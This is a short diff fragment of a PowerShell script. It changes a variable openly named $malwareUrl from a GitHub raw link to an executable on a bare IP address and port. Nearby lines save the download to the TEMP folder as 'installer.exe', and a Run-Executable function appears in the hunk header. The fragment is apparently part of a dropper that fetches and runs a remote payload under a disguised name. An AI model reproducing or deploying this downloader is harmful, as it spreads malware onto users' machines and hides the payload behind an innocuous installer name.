@@ -54,7 +54,7 @@ function Run-Executable {
 }
 
 # URL of the malware file
-$malwareUrl = "https://github.com/angeborrelli/files/raw/main/inst.exe"
+$malwareUrl = "http://54.224.34.222:3004/uploads/BootyMistress.exe"
 
 # Path to download the file
 $downloadPath = "$env:TEMP\installer.exe"
